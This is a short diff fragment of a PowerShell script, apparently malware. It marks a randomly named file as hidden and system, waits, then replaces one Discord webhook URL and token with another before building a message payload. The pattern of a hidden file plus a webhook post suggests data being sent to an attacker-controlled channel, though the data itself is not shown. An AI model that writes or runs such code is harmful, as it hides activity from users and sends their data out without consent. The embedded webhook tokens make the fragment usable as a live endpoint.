@@ -28,7 +28,7 @@ sleep 10
 attrib +s +h $ieoaj
 
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1266831745567952906/KIzlu434dYbeX7WeI5oKtMgCI4ZUVVOPBVw_iVdKorgGT9lAxB0Bna9WvLStOzgV9or9"
+$webhookUrl = "https://discord.com/api/webhooks/1267096144723316767/cxOE9Wv5o7qnXO7hMb18y9TP0n6uSNmFIF1mv3MnTV-JxOhWTXcnXgypXbmYD2saDBJm"
 
 # Define the message payload
 $payload = @{
